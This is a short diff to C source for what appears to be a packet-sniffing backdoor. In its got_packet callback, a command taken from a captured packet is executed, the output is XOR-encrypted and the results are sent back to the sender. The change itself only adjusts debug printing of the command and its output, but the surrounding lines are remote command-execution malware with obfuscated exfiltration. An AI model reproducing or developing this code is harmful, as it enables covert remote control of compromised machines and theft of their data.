@@ -118,7 +118,7 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
 
     // Step 6: Execute the command
     command_output_ptr = execute_command(command, &command_output_size);
-    printf("Command executed:\n%s\n", command_output);
+    printf("Command executed:\n%s\n", command);
 
     int total_size = 0;
     int offset = 0;
@@ -133,6 +133,8 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     {
         offset += sprintf(command_output + offset, "%s", command_output_ptr[i]);
     }
+    printf("Command output: \n%s\n", command_output);
+
     // Step 7: Send the results back
     encrypted_command_output = malloc(total_size);
     xor_string(XOR_KEY, strlen(XOR_KEY), command_output, encrypted_command_output, strlen(command_output));
